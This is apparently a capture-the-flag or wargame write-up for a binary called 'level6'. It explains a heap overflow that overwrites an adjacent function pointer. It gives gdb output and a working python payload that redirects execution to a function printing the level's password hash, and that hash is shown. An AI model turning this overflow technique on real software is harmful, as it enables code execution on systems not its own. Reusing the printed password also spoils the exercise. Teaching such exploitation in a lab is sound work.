We have rewritten the code, and it's pretty explicit: \
the main allocates a pointer to the function `m` that we can override because its allocated juste after the first malloc which is our buffer where we write to. \
So we only need to fill the buffer, write a few more bytes to override malloc's header, and then we can write the address of the funtion n to get the password:
```shell
$ gdb ./level6

(gdb) p n
$4 = {<text variable, no debug info>} 0x8048454 <n>

(gdb) quit

$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

